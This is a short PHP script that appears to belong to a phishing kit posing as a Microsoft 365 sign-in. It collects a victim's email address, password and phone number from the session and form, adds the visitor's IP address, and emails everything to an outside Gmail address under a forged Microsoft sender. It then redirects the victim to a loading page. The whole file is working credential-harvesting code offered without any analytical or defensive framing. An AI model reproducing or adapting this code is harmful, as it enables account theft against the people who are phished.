<?php
session_start();

$ip = getenv("REMOTE_ADDR");
$phone = $_POST['phone'];
$_SESSION['phone'] = $_POST['phone'];

$msg = "

Email Address: ".$_SESSION['email']."
Password : ".$_SESSION['password']."
Phone Number : ".$_POST['phone']."
------# 3lda-Car!bo #-------
IP Address: $ip
";

$subj = "Microsoft 365 Online";
$headers = "From: Microsoft <Microsoft@dc.com>\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";

mail("ikharlosoffices@gmail.com", $subj, $msg,"$headers");

header("Location: loading.php");
?>

